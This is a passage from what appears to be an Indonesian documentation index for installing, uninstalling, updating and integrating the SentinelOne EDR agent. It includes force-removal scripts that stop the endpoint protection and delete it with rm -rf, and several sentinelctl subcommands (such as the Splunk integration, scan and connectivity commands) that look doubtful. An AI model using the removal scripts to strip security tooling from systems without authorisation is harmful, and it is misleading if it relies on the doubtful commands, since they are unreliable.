Installation","text":"<p>Instalasi Silent dengan MSI: <pre><code>msiexec /i SentinelInstaller_windows_64bit.msi /quiet SITE_TOKEN=your_site_token_here\n</code></pre></p> <p>Instalasi dengan Parameter Tambahan: <pre><code>msiexec /i SentinelInstaller_windows_64bit.msi /quiet SITE_TOKEN=your_site_token_here REBOOT=ReallySuppress\n</code></pre></p>"},{"location":"installation/edr-install/#metode-2-gui-installation","title":"Metode 2: GUI Installation","text":"<ol> <li>Jalankan file installer <code>SentinelInstaller_windows_64bit.msi</code></li> <li>Ikuti wizard instalasi</li> <li>Masukkan Site Token ketika diminta</li> <li>Tunggu hingga instalasi selesai</li> <li>Restart sistem jika diperlukan</li> </ol>"},{"location":"installation/edr-install/#metode-3-powershell-installation","title":"Metode 3: PowerShell Installation","text":"<pre><code># Download installer\n$installer = \"SentinelInstaller_windows_64bit.msi\"\n$token = \"your_site_token_here\"\n\n# Install silently\nStart-Process msiexec.exe -ArgumentList \"/i $installer /quiet SITE_TOKEN=$token\" -Wait\n</code></pre>"},{"location":"installation/edr-install/#verifikasi-instalasi","title":"Verifikasi Instalasi","text":"<pre><code>\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n</code></pre>"},{"location":"installation/edr-install/#metode-1-rpm-based-systems-centosrhelfedora","title":"Metode 1: RPM-based Systems (CentOS/RHEL/Fedora)","text":"<p>Instalasi langsung: <pre><code># Install package\nsudo rpm -i SentinelAgent_linux.rpm\n\n# Set site token\nsudo /opt/sentinelone/bin/sentinelctl management token set YOUR_SITE_TOKEN\n\n# Start agent\nsudo /opt/sentinelone/bin/sentinelctl control start\n</code></pre></p> <p>Instalasi dengan yum/dnf: <pre><code># Install using yum\nsudo yum localinstall SentinelAgent_linux.rpm\n\n# Or using dnf (newer systems)\nsudo dnf install SentinelAgent_linux.rpm\n\n# Configure and start\nsudo /opt/sentinelone/bin/sentinelctl management token set YOUR_SITE_TOKEN\nsudo /opt/sentinelone/bin/sentinelctl control start\n</code></pre></p>"},{"location":"installation/edr-install/#metode-2-deb-based-systems-ubuntudebian","title":"Metode 2: DEB-based Systems (Ubuntu/Debian)","text":"<p>Instalasi langsung: <pre><code># Install package\nsudo dpkg -i SentinelAgent_linux.deb\n\n# Fix dependencies if needed\nsudo apt-get install -f\n\n# Set site token\nsudo /opt/sentinelone/bin/sentinelctl management token set YOUR_SITE_TOKEN\n\n# Start agent\nsudo /opt/sentinelone/bin/sentinelctl control start\n</code></pre></p> <p>Instalasi dengan apt: <pre><code># Install using apt\nsudo apt install ./SentinelAgent_linux.deb\n\n# Configure and start\nsudo /opt/sentinelone/bin/sentinelctl management token set YOUR_SITE_TOKEN\nsudo /opt/sentinelone/bin/sentinelctl control start\n</code></pre></p>"},{"location":"installation/edr-install/#metode-3-generic-installation-script","title":"Metode 3: Generic Installation Script","text":"<pre><code>#!/bin/bash\n# SentinelOne Installation Script\n\nSITE_TOKEN=\"YOUR_SITE_TOKEN\"\nINSTALLER_PATH=\"/path/to/SentinelAgent_linux.rpm\"  # or .deb\n\n# Detect package manager\nif command -v rpm \u00003e /dev/null 2\u00003e&amp;1; then\n    sudo rpm -i \"$INSTALLER_PATH\"\nelif command -v dpkg \u00003e /dev/null 2\u00003e&amp;1; then\n    sudo dpkg -i \"$INSTALLER_PATH\"\n    sudo apt-get install -f  # Fix dependencies\nfi\n\n# Configure agent\nsudo /opt/sentinelone/bin/sentinelctl management token set \"$SITE_TOKEN\"\nsudo /opt/sentinelone/bin/sentinelctl control start\n\n# Verify installation\nsudo /opt/sentinelone/bin/sentinelctl status\n</code></pre>"},{"location":"installation/edr-install/#verifikasi-instalasi_1","title":"Verifikasi Instalasi","text":"<pre><code>sudo /opt/sentinelone/bin/sentinelctl status\nsudo systemctl status sentinelone\n</code></pre>"},{"location":"installation/edr-install/#metode-1-command-line-installation_1","title":"Metode 1: Command Line Installation","text":"<p>Instalasi dengan installer command: <pre><code># Install package\nsudo installer -pkg SentinelAgent_macos.pkg -target /\n\n# Set site token\nsudo /Library/Sentinelone/sentinel/bin/sentinelctl management token set YOUR_SITE_TOKEN\n\n# Start agent\nsudo /Library/Sentinelone/sentinel/bin/sentinelctl control start\n</code></pre></p>"},{"location":"installation/edr-install/#metode-2-gui-installation_1","title":"Metode 2: GUI Installation","text":"<ol> <li>Double-click file <code>SentinelAgent_macos.pkg</code></li> <li>Ikuti wizard instalasi macOS</li> <li>Masukkan password administrator ketika diminta</li> <li>Buka Terminal setelah instalasi</li> <li>Set site token:    <pre><code>sudo /Library/Sentinelone/sentinel/bin/sentinelctl management token set YOUR_SITE_TOKEN\nsudo /Library/Sentinelone/sentinel/bin/sentinelctl control start\n</code></pre></li> </ol>"},{"location":"installation/edr-install/#metode-3-automated-script","title":"Metode 3: Automated Script","text":"<pre><code>#!/bin/bash\n# SentinelOne macOS Installation Script\n\nSITE_TOKEN=\"YOUR_SITE_TOKEN\"\nPKG_PATH=\"/path/to/SentinelAgent_macos.pkg\"\n\n# Install package\nsudo installer -pkg \"$PKG_PATH\" -target /\n\n# Wait for installation to complete\nsleep 10\n\n# Configure agent\nsudo /Library/Sentinelone/sentinel/bin/sentinelctl management token set \"$SITE_TOKEN\"\nsudo /Library/Sentinelone/sentinel/bin/sentinelctl control start\n\n# Verify installation\nsudo /Library/Sentinelone/sentinel/bin/sentinelctl status\n</code></pre>"},{"location":"installation/edr-install/#verifikasi-instalasi_2","title":"Verifikasi Instalasi","text":"<pre><code>sudo /Library/Sentinelone/sentinel/bin/sentinelctl status\nsudo launchctl list | grep sentinelone\n</code></pre>"},{"location":"installation/edr-install/#4-verifikasi-instalasi","title":"4. Verifikasi Instalasi","text":"<ul> <li> <p>Windows: <pre><code>\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" status\n</code></pre></p> </li> <li> <p>Linux: <pre><code>sudo /opt/sentinelone/bin/sentinelctl status\n</code></pre></p> </li> <li> <p>macOS: <pre><code>sudo /Library/Sentinelone/sentinel/bin/sentinelctl status\n</code></pre></p> </li> <li> <p>Console:</p> </li> <li>Cek di Sentinels untuk keterhubungan endpoint</li> <li>Status harus Online dan Protected</li> </ul>"},{"location":"installation/edr-install/#troubleshooting-umum","title":"Troubleshooting Umum","text":"<ul> <li>Agent Tidak Muncul di Console</li> <li>Penyebab: Token salah atau masalah jaringan</li> <li> <p>Solusi: Pastikan token benar dan periksa koneksi</p> </li> <li> <p>Gagal Instalasi</p> </li> <li>Penyebab: Privilege tidak cukup</li> <li> <p>Solusi: Jalankan sebagai Administrator/root</p> </li> <li> <p>Agent Offline</p> </li> <li>Penyebab: Firewall memblokir koneksi</li> <li> <p>Solusi: Periksa pengaturan firewall dan jaringan</p> </li> <li> <p>Penggunaan CPU Tinggi</p> </li> <li>Penyebab: Pemindaian real-time</li> <li>Solusi: Atur exclusion untuk aplikasi kritis</li> </ul>"},{"location":"installation/edr-install/#uninstall-sentinelone-edr-agent","title":"Uninstall SentinelOne EDR Agent","text":"<p>Penting</p> <p>Proses uninstall akan menghapus semua proteksi pada endpoint. Pastikan Anda memiliki alternatif keamanan sebelum melakukan uninstall.</p> WindowsLinuxmacOS"},{"location":"installation/edr-install/#metode-1-command-line-uninstall","title":"Metode 1: Command Line Uninstall","text":"<p>Menggunakan SentinelCtl: <pre><code>\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" uninstall\n</code></pre></p> <p>Uninstall dengan passphrase (jika ada): <pre><code>\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" uninstall --passphrase \"your_passphrase\"\n</code></pre></p>"},{"location":"installation/edr-install/#metode-2-msi-uninstall","title":"Metode 2: MSI Uninstall","text":"<p>Find product code and uninstall: <pre><code># Find SentinelOne product code\nwmic product where \"name like '%SentinelOne%'\" get identifyingnumber,name\n\n# Uninstall using product code\nmsiexec /x {PRODUCT-CODE} /quiet\n</code></pre></p>"},{"location":"installation/edr-install/#metode-3-programs-and-features","title":"Metode 3: Programs and Features","text":"<ol> <li>Buka Control Panel \u00003e Programs and Features</li> <li>Cari \"SentinelOne\" dalam daftar</li> <li>Klik Uninstall</li> <li>Ikuti wizard uninstall</li> </ol>"},{"location":"installation/edr-install/#metode-4-powershell-uninstall","title":"Metode 4: PowerShell Uninstall","text":"<pre><code># Get SentinelOne installation\n$sentinelone = Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like \"*SentinelOne*\"}\n\n# Uninstall\nif ($sentinelone) {\n    $sentinelone.Uninstall()\n    Write-Host \"SentinelOne uninstalled successfully\"\n}\n</code></pre>"},{"location":"installation/edr-install/#metode-1-sentinelctl-uninstall","title":"Metode 1: SentinelCtl Uninstall","text":"<p>Standard uninstall: <pre><code>sudo /opt/sentinelone/bin/sentinelctl uninstall\n</code></pre></p> <p>Uninstall dengan passphrase: <pre><code>sudo /opt/sentinelone/bin/sentinelctl uninstall --passphrase \"your_passphrase\"\n</code></pre></p>"},{"location":"installation/edr-install/#metode-2-package-manager-uninstall","title":"Metode 2: Package Manager Uninstall","text":"<p>RPM-based systems: <pre><code># Find package name\nrpm -qa | grep -i sentinel\n\n# Remove package\nsudo rpm -e SentinelAgent\n\n# Or using yum/dnf\nsudo yum remove SentinelAgent\nsudo dnf remove SentinelAgent\n</code></pre></p> <p>DEB-based systems: <pre><code># Find package name\ndpkg -l | grep -i sentinel\n\n# Remove package\nsudo dpkg -r sentinelagent\n\n# Or using apt\nsudo apt remove sentinelagent\nsudo apt purge sentinelagent  # Remove config files too\n</code></pre></p>"},{"location":"installation/edr-install/#metode-3-force-removal-script","title":"Metode 3: Force Removal Script","text":"<pre><code>#!/bin/bash\n# Force removal of SentinelOne (use with caution)\n\necho \"Stopping SentinelOne services...\"\nsudo systemctl stop sentinelone\nsudo systemctl disable sentinelone\n\necho \"Removing SentinelOne files...\"\nsudo rm -rf /opt/sentinelone/\nsudo rm -rf /etc/sentinelone/\nsudo rm -f /etc/systemd/system/sentinelone.service\n\necho \"Cleaning up systemd...\"\nsudo systemctl daemon-reload\n\necho \"SentinelOne force removal completed\"\n</code></pre>"},{"location":"installation/edr-install/#metode-1-sentinelctl-uninstall_1","title":"Metode 1: SentinelCtl Uninstall","text":"<p>Standard uninstall: <pre><code>sudo /Library/Sentinelone/sentinel/bin/sentinelctl uninstall\n</code></pre></p> <p>Uninstall dengan passphrase: <pre><code>sudo /Library/Sentinelone/sentinel/bin/sentinelctl uninstall --passphrase \"your_passphrase\"\n</code></pre></p>"},{"location":"installation/edr-install/#metode-2-manual-removal","title":"Metode 2: Manual Removal","text":"<pre><code># Stop SentinelOne service\nsudo launchctl unload /Library/LaunchDaemons/com.sentinelone.*\n\n# Remove SentinelOne files\nsudo rm -rf /Library/Sentinelone/\nsudo rm -f /Library/LaunchDaemons/com.sentinelone.*\nsudo rm -rf /Library/Application\\ Support/SentinelOne/\n</code></pre>"},{"location":"installation/edr-install/#metode-3-uninstall-script","title":"Metode 3: Uninstall Script","text":"<pre><code>#!/bin/bash\n# SentinelOne macOS Uninstall Script\n\necho \"Uninstalling SentinelOne from macOS...\"\n\n# Try sentinelctl first\nif [ -f \"/Library/Sentinelone/sentinel/bin/sentinelctl\" ]; then\n    echo \"Using sentinelctl for removal...\"\n    sudo /Library/Sentinelone/sentinel/bin/sentinelctl uninstall\nelse\n    echo \"Manual removal...\"\n    sudo launchctl unload /Library/LaunchDaemons/com.sentinelone.* 2\u00003e/dev/null\n    sudo rm -rf /Library/Sentinelone/\n    sudo rm -f /Library/LaunchDaemons/com.sentinelone.*\n    sudo rm -rf /Library/Application\\ Support/SentinelOne/\nfi\n\necho \"SentinelOne uninstall completed\"\n</code></pre>"},{"location":"installation/edr-install/#verifikasi-uninstall","title":"Verifikasi Uninstall","text":"WindowsLinuxmacOS <pre><code># Check if services are removed\nsc query SentinelAgent\nsc query SentinelHelperService\n\n# Check if files are removed\ndir \"C:\\Program Files\\SentinelOne\"\n</code></pre> <pre><code># Check if package is removed\nrpm -qa | grep -i sentinel\ndpkg -l | grep -i sentinel\n\n# Check if services are stopped\nsudo systemctl status sentinelone\n\n# Check if files are removed\nls -la /opt/sentinelone/\n</code></pre> <pre><code># Check if services are removed\nsudo launchctl list | grep sentinelone\n\n# Check if files are removed\nls -la /Library/Sentinelone/\n</code></pre>"},{"location":"installation/edr-install/#troubleshooting-uninstall","title":"Troubleshooting Uninstall","text":"<p>Common Issues</p> <ul> <li>Password/Passphrase Required: Hubungi administrator untuk mendapatkan passphrase uninstall</li> <li>Service Won't Stop: Force stop service sebelum uninstall</li> <li>Files Still Present: Manual removal mungkin diperlukan</li> <li>Permission Denied: Pastikan running sebagai admin/root</li> <li>Connection Lost During Uninstall: Lihat bagian Decommissioning di bawah</li> </ul>"},{"location":"installation/edr-install/#decommissioning-agent-from-console","title":"Decommissioning Agent from Console","text":"<p>Uninstall dengan Gangguan Koneksi</p> <p>Ketika terjadi gangguan koneksi internet saat proses uninstall, agent mungkin sudah terhapus dari endpoint tetapi masih tercatat online atau offline di Management Console. Dalam situasi ini, endpoint perlu di-decommission manual dari console.</p> <p>Skenario yang Memerlukan Decommissioning:</p> <ul> <li>Uninstall saat koneksi internet terputus</li> <li>Agent tidak merespon command dari console</li> <li>Endpoint sudah tidak ada tapi masih muncul di console</li> <li>Status endpoint menunjukkan \"offline\" padahal sudah di-uninstall</li> </ul> <p>Langkah-langkah Decommissioning:</p> <ol> <li> <p>Login ke Management Console <pre><code>URL: https://your-tenant.sentinelone.net\nNavigate: Sentinels \u2192 [Select Endpoint]\n</code></pre></p> </li> <li> <p>Locate the Affected Endpoint <pre><code>Filter by: Endpoint name, IP address, atau status\nStatus: Biasanya menampilkan \"Offline\" atau \"Disconnected\"\n</code></pre></p> </li> <li> <p>Decommission Process <pre><code>Right-click endpoint \u2192 Actions \u2192 Decommission\nAtau: Select endpoint \u2192 Actions menu \u2192 Decommission\nConfirm: Centang \"I understand this action cannot be undone\"\nClick: \"Decommission\"\n</code></pre></p> </li> <li> <p>Verification <pre><code>Check: Endpoint hilang dari Sentinels list\nStatus: Tidak muncul lagi di console\nLicense: License slot tersedia untuk endpoint baru\n</code></pre></p> </li> </ol> <p>Alternative via API (Advanced):</p> <pre><code># Decommission via SentinelOne API\ncurl -X POST \"https://your-tenant.sentinelone.net/web/api/v2.1/agents/actions/decommission\" \\\n  -H \"Authorization: ApiToken your-api-token\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"filter\": {\n      \"ids\": [\"agent-id-here\"]\n    },\n    \"data\": {}\n  }'\n</code></pre> <p>Kapan Melakukan Decommissioning:</p> <ul> <li>\u2705 After Physical Uninstall: Setelah memastikan agent benar-benar terhapus dari endpoint</li> <li>\u2705 Endpoint Disposal: Ketika endpoint/server sudah tidak digunakan lagi</li> <li>\u2705 Migration: Sebelum install ulang atau migrasi ke tenant lain</li> <li>\u274c Active Endpoint: Jangan decommission endpoint yang masih aktif dan terkoneksi</li> </ul>"},{"location":"installation/edr-install/#praktik-terbaik","title":"Praktik Terbaik","text":"<ul> <li>Instalasi Massal: Gunakan alat seperti SCCM atau Ansible</li> <li>Uji Coba: Selalu uji di lab sebelum deploy ke produk</li> <li>Dokumentasi: Catat semua endpoint yang diinstal</li> <li>Pemantauan: Awasi resource setelah instalasi</li> <li>Exclusion: Siapkan exclusion list sebelum instalasi</li> <li>Backup Configuration: Simpan konfigurasi sebelum uninstall</li> <li>Alternative Security: Pastikan ada proteksi alternatif sebelum uninstall</li> </ul> <p>Gunakan panduan ini untuk memastikan setiap langkah diimplementasikan dengan benar.</p> <p>Last updated: 6 Agustus 2025</p>"},{"location":"installation/edr-install/#post-installation-configuration","title":"Post-Installation Configuration","text":"<p>Setelah instalasi berhasil, lakukan konfigurasi berikut:</p> <ol> <li>Configure Exclusions - Setup file/folder/app exclusions</li> <li>Resource Monitoring - Monitor resource usage</li> <li>Policy Configuration - Configure detection policies</li> </ol> <p>Untuk bantuan lebih lanjut, hubungi Security Team atau rujuk ke dokumentasi official SentinelOne.</p>"},{"location":"installation/sensor-update/","title":"Update Sensor/Patch SentinelOne EDR","text":"<p>Panduan teknis untuk melakukan update sensor EDR dengan berbagai metode deployment.</p>"},{"location":"installation/sensor-update/#pre-update-checklist","title":"Pre-Update Checklist","text":""},{"location":"installation/sensor-update/#1-cek-versi-saat-ini","title":"1. Cek Versi Saat Ini","text":"<pre><code># Via agent command\nsentinelctl version\n\n# Via console\nConsole &gt; Sentinels &gt; Version Column\n</code></pre>"},{"location":"installation/sensor-update/#2-download-update-package","title":"2. Download Update Package","text":"<pre><code>Console &gt; Updates &gt; Download Latest Package\n</code></pre>"},{"location":"installation/sensor-update/#update-methods","title":"Update Methods","text":""},{"location":"installation/sensor-update/#method-1-console-push-update","title":"Method 1: Console Push Update","text":"<pre><code>1. Console &gt; Sentinels\n2. Select endpoints\n3. Actions &gt; Update Agent\n4. Confirm update\n</code></pre>"},{"location":"installation/sensor-update/#method-2-command-line-update","title":"Method 2: Command Line Update","text":"<pre><code># Windows\n\"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelCtl.exe\" update --package \"path\\to\\update.msi\"\n\n# Linux\nsudo /opt/sentinelone/bin/sentinelctl update --package \"/path/to/update.rpm\"\n</code></pre>"},{"location":"installation/sensor-update/#method-3-sccm-deployment","title":"Method 3: SCCM Deployment","text":"<pre><code># SCCM Package Command\nmsiexec /i SentinelAgent_update.msi /quiet /l*v update.log\n</code></pre>"},{"location":"installation/sensor-update/#method-4-script-automation","title":"Method 4: Script Automation","text":"<pre><code>#!/bin/bash\n# Bulk update script\n\nUPDATE_FILE=\"/path/to/SentinelAgent_update.rpm\"\nLOG_FILE=\"/var/log/sentinel_update.log\"\n\necho \"Starting SentinelOne update: $(date)\" &gt;&gt; $LOG_FILE\n\n# Check current version\nCURRENT_VERSION=$(sentinelctl version | grep Version | awk '{print $2}')\necho \"Current version: $CURRENT_VERSION\" &gt;&gt; $LOG_FILE\n\n# Perform update\nif sudo /opt/sentinelone/bin/sentinelctl update --package $UPDATE_FILE; then\n    echo \"Update successful\" &gt;&gt; $LOG_FILE\n    NEW_VERSION=$(sentinelctl version | grep Version | awk '{print $2}')\n    echo \"New version: $NEW_VERSION\" &gt;&gt; $LOG_FILE\nelse\n    echo \"Update failed\" &gt;&gt; $LOG_FILE\n    exit 1\nfi\n</code></pre>"},{"location":"installation/sensor-update/#update-verification","title":"Update Verification","text":""},{"location":"installation/sensor-update/#1-check-agent-status","title":"1. Check Agent Status","text":"<pre><code># Verify agent is running\nsentinelctl status\n\n# Expected output:\nAgent Status: Running\nConnection Status: Connected\nProtection Status: Protected\n</code></pre>"},{"location":"installation/sensor-update/#2-version-verification","title":"2. Version Verification","text":"<pre><code># Check new version\nsentinelctl version\n\n# Verify in console\nConsole &gt; Sentinels &gt; Check Version Column\n</code></pre>"},{"location":"installation/sensor-update/#3-functionality-test","title":"3. Functionality Test","text":"<pre><code># Test scanning capability\nsentinelctl scan --path /tmp/test\n\n# Check connectivity\nsentinelctl connectivity test\n</code></pre>"},{"location":"installation/sensor-update/#error-troubleshooting","title":"Error Troubleshooting","text":""},{"location":"installation/sensor-update/#error-update-package-corrupted","title":"Error: \"Update package corrupted\"","text":"<p>Penyebab: File download incomplete Solusi: <pre><code># Verify package integrity\nmd5sum SentinelAgent_update.rpm\n# Compare with official MD5\n\n# Re-download if mismatch\nwget https://console.sentinelone.com/update/package.rpm\n</code></pre></p>"},{"location":"installation/sensor-update/#error-insufficient-disk-space","title":"Error: \"Insufficient disk space\"","text":"<p>Penyebab: Disk space kurang Solusi: <pre><code># Check disk space\ndf -h\n\n# Clean temporary files\nsudo rm -rf /var/tmp/sentinel*\nsudo rm -rf /tmp/sentinel*\n\n# Retry update\n</code></pre></p>"},{"location":"installation/sensor-update/#error-agent-unresponsive-after-update","title":"Error: \"Agent unresponsive after update\"","text":"<p>Penyebab: Service tidak restart properly Solusi: <pre><code># Restart agent service\n# Windows\nnet stop \"SentinelAgent\" &amp;&amp; net start \"SentinelAgent\"\n\n# Linux\nsudo systemctl restart sentinelone\n\n# Verify status\nsentinelctl status\n</code></pre></p>"},{"location":"installation/sensor-update/#error-policy-sync-failed","title":"Error: \"Policy sync failed\"","text":"<p>Penyebab: Network connectivity issue Solusi: <pre><code># Force policy sync\nsentinelctl management policy update\n\n# Check connectivity\nsentinelctl connectivity test\n\n# Verify DNS resolution\nnslookup console.sentinelone.com\n</code></pre></p>"},{"location":"installation/sensor-update/#rollback-procedure","title":"Rollback Procedure","text":""},{"location":"installation/sensor-update/#emergency-rollback","title":"Emergency Rollback","text":"<pre><code># Windows\nmsiexec /x {PRODUCT-CODE} /quiet\nmsiexec /i old_version.msi /quiet SITE_TOKEN=token\n\n# Linux\nsudo rpm -e sentinelone-agent\nsudo rpm -i old_version.rpm\nsudo sentinelctl management token set TOKEN\nsudo sentinelctl control start\n</code></pre>"},{"location":"installation/sensor-update/#batch-update-script","title":"Batch Update Script","text":"<pre><code>#!/usr/bin/env python3\n# bulk_update.py\n\nimport subprocess\nimport csv\nimport logging\n\n# Setup logging\nlogging.basicConfig(filename='update.log', level=logging.INFO)\n\n# Read endpoint list\nwith open('endpoints.csv', 'r') as file:\n    reader = csv.reader(file)\n    for row in reader:\n        hostname = row[0]\n        try:\n            # SSH to remote host and update\n            cmd = f\"ssh {hostname} 'sudo sentinelctl update --package /tmp/update.rpm'\"\n            result = subprocess.run(cmd, shell=True, capture_output=True)\n\n            if result.returncode == 0:\n                logging.info(f\"Update successful on {hostname}\")\n            else:\n                logging.error(f\"Update failed on {hostname}: {result.stderr}\")\n\n        except Exception as e:\n            logging.error(f\"Error updating {hostname}: {str(e)}\")\n</code></pre> <p>Hubungi admin IT Anda jika mengalami kesulitan selama proses update.</p> <p>Last updated: 5 Agustus 2025</p>"},{"location":"integration/third-party-integration/","title":"Integrasi SentinelOne dengan Sistem Pihak Ketiga","text":"<p>Panduan komprehensif untuk mengintegrasikan SentinelOne EDR dengan berbagai sistem keamanan, monitoring, dan operasional enterprise.</p>"},{"location":"integration/third-party-integration/#arsitektur-integrasi-enterprise","title":"\ud83d\udd17 Arsitektur Integrasi Enterprise","text":""},{"location":"integration/third-party-integration/#overview-integrasi-utama","title":"Overview Integrasi Utama","text":"<pre><code>flowchart TD\n    S1[\"\ud83d\udee1\ufe0f SentinelOne&lt;br/&gt;Management Console\"]\n\n    S1 --&gt; SIEM[\"\ud83d\udcca SIEM Integration\"]\n    S1 --&gt; SOAR[\"\ud83e\udd16 SOAR Integration\"]\n    S1 --&gt; ITSM[\"\ud83c\udfab ITSM Integration\"]\n    S1 --&gt; THREAT[\"\ud83c\udfaf Threat Intelligence\"]\n    S1 --&gt; COMM[\"\ud83d\udcac Communication\"]\n\n    SIEM --&gt; SIEM_TOOLS[\"Splunk | QRadar&lt;br/&gt;Azure Sentinel | Elastic\"]\n    SOAR --&gt; SOAR_TOOLS[\"Phantom | XSOAR&lt;br/&gt;Swimlane | Demisto\"]\n    ITSM --&gt; ITSM_TOOLS[\"ServiceNow | JIRA&lt;br/&gt;BMC Remedy\"]\n    THREAT --&gt; THREAT_TOOLS[\"MISP | ThreatConnect&lt;br/&gt;AlienVault OTX\"]\n    COMM --&gt; COMM_TOOLS[\"Slack | Teams&lt;br/&gt;Email | Webhooks\"]\n\n    style S1 fill:#e3f2fd,stroke:#1976d2,stroke-width:3px\n    style SIEM fill:#e8f5e8,stroke:#4caf50,stroke-width:2px\n    style SOAR fill:#fff3e0,stroke:#ff9800,stroke-width:2px\n    style ITSM fill:#fce4ec,stroke:#e91e63,stroke-width:2px\n    style THREAT fill:#f3e5f5,stroke:#9c27b0,stroke-width:2px\n    style COMM fill:#e0f2f1,stroke:#00796b,stroke-width:2px</code></pre>"},{"location":"integration/third-party-integration/#alur-data-dan-integrasi-detail","title":"Alur Data dan Integrasi Detail","text":"<pre><code>flowchart LR\n    subgraph \"\ud83c\udfe2 SentinelOne Core\"\n        CONSOLE[\"Management&lt;br/&gt;Console\"]\n        API[\"REST API&lt;br/&gt;GraphQL\"]\n        AGENTS[\"EDR Agents&lt;br/&gt;Endpoints\"]\n    end\n\n    subgraph \"\ud83d\udcca SIEM Systems\"\n        SPLUNK[\"Splunk&lt;br/&gt;Enterprise\"]\n        QRADAR[\"IBM&lt;br/&gt;QRadar\"]\n        SENTINEL[\"Azure&lt;br/&gt;Sentinel\"]\n    end\n\n    subgraph \"\ud83e\udd16 SOAR Platforms\"\n        PHANTOM[\"Splunk&lt;br/&gt;Phantom\"]\n        XSOAR[\"Cortex&lt;br/&gt;XSOAR\"]\n    end\n\n    subgraph \"\ud83c\udfab ITSM Tools\"\n        SNOW[\"ServiceNow\"]\n        JIRA[\"JIRA\"]\n    end\n\n    AGENTS --&gt; CONSOLE\n    CONSOLE --&gt; API\n\n    API --&gt;|\"Events &amp; Alerts&lt;br/&gt;Real-time\"| SPLUNK\n    API --&gt;|\"Security Events&lt;br/&gt;JSON/CEF\"| QRADAR\n    API --&gt;|\"Log Forwarding&lt;br/&gt;Webhook\"| SENTINEL\n\n    API --&gt;|\"Incident Trigger&lt;br/&gt;Playbook\"| PHANTOM\n    API --&gt;|\"Automation&lt;br/&gt;Response\"| XSOAR\n\n    API --&gt;|\"Ticket Creation&lt;br/&gt;REST API\"| SNOW\n    API --&gt;|\"Issue Tracking&lt;br/&gt;Webhook\"| JIRA\n\n    style CONSOLE fill:#e3f2fd\n    style API fill:#f3e5f5\n    style AGENTS fill:#e8f5e8</code></pre>"},{"location":"integration/third-party-integration/#siem-integration","title":"\ud83c\udf9b\ufe0f SIEM Integration","text":""},{"location":"integration/third-party-integration/#11-splunk-integration","title":"1.1 Splunk Integration","text":""},{"location":"integration/third-party-integration/#architecture-overview","title":"Architecture Overview","text":"<pre><code>sequenceDiagram\n    participant S1 as SentinelOne Console\n    participant API as SentinelOne API\n    participant HEC as Splunk HEC\n    participant SPLUNK as Splunk Enterprise\n    participant ANALYST as SOC Analyst\n\n    S1-&gt;&gt;API: Generate Events &amp; Alerts\n    API-&gt;&gt;HEC: Forward Events (JSON)\n    HEC-&gt;&gt;SPLUNK: Index Security Events\n    SPLUNK-&gt;&gt;SPLUNK: Create Dashboards &amp; Searches\n    ANALYST-&gt;&gt;SPLUNK: Monitor &amp; Investigate\n    SPLUNK-&gt;&gt;API: Query Additional Data\n    API-&gt;&gt;ANALYST: Enriched Context</code></pre>"},{"location":"integration/third-party-integration/#configuration-steps","title":"Configuration Steps","text":"<p>Step 1: Setup Splunk HTTP Event Collector <pre><code># Splunk Configuration\n# Enable HEC in Splunk\nsplunk enable http-event-collector -auth admin:password\n\n# Create HEC token\nsplunk http-event-collector create sentinelone-token \\\n  -uri https://splunk.company.com:8089 \\\n  -auth admin:password \\\n  -index sentinelone \\\n  -sourcetype sentinelone:alert\n</code></pre></p> <p>Step 2: Configure SentinelOne Integration <pre><code># Via sentinelctl\nsudo sentinelctl integration splunk configure \\\n  --hec-url \"https://splunk.company.com:8088/services/collector\" \\\n  --hec-token \"your-hec-token\" \\\n  --index \"sentinelone\" \\\n  --source \"sentinelone_edr\" \\\n  --sourcetype \"sentinelone:threat\"\n\n# Test the integration\nsudo sentinelctl integration splunk test\n</code></pre></p> <p>Step 3: Splunk App Configuration <pre><code># Create Splunk searches for SentinelOne data\nindex=sentinelone sourcetype=sentinelone:threat\n| eval threat_name=json_extract(rawdata, \"threatInfo.threatName\")\n| eval endpoint_name=json_extract(rawdata, \"agentRealtimeInfo.agentComputerName\")\n| eval severity=json_extract(rawdata, \"ruleInfo.severity\")\n| stats count by threat_name, endpoint_name, severity\n| sort -count\n</code></pre></p>"},{"location":"integration/third-party-integration/#12-ibm-qradar-integration","title":"1.2 IBM QRadar Integration","text":""},{"location":"integration/third-party-integration/#qradar-dsm-configuration","title":"QRadar DSM Configuration","text":"<pre><code>&lt;!-- QRadar Device Support Module for SentinelOne --&gt;\n&lt;device-extension xmlns=\"event_parsing/device_extension\"&gt;\n  &lt;pattern id=\"SentinelOnePattern\"&gt;\n    &lt;![CDATA[SentinelOne\\s+(\\S+)\\s+(.*)]]&gt;\n  &lt;/pattern&gt;\n  &lt;event-match pattern-id=\"SentinelOnePattern\"&gt;\n    &lt;event category-id=\"6003\" severity=\"5\"&gt;\n      &lt;property-matches&gt;\n        &lt;property-match property=\"DeviceType\" value=\"SentinelOne EDR\"/&gt;\n        &lt;property-match property=\"ThreatName\" capture-group=\"1\"/&gt;\n        &lt;property-match property=\"Message\" capture-group=\"2\"/&gt;\n      &lt;/property-matches&gt;\n    &lt;/event&gt;\n  &lt;/event-match&gt;\n&lt;/device-extension&gt;\n</code></pre>"},{"location":"integration/third-party-integration/#13-azure-sentinel-integration","title":"1.3 Azure Sentinel Integration","text":""},{"location":"integration/third-party-integration/#data-connector-configuration","title":"Data Connector Configuration","text":"<pre><code>{\n  \"kind\": \"SentinelOneDataConnector\",\n  \"properties\": {\n    \"connectorUiConfig\": {\n      \"title\": \"SentinelOne EDR\",\n      \"publisher\": \"SentinelOne\",\n      \"descriptionMarkdown\": \"Connect SentinelOne EDR to Azure Sentinel\",\n      \"graphQueries\": [\n        {\n          \"metricName\": \"Total events received\",\n          \"legend\": \"SentinelOne Events\",\n          \"baseQuery\": \"SentinelOne_CL | summarize Events = count() by bin(TimeGenerated, 1h)\"\n        }\n      ]\n    }\n  }\n}\n</code></pre>"},{"location":"integration/third-party-integration/#soar-integration","title":"\ud83e\udd16 SOAR Integration","text":""},{"location":"integration/third-party-integration/#21-splunk-phantom-integration","title":"2.1 Splunk Phantom Integration","text":""},{"location":"integration/third-party-integration/#phantom-app-architecture","title":"Phantom App 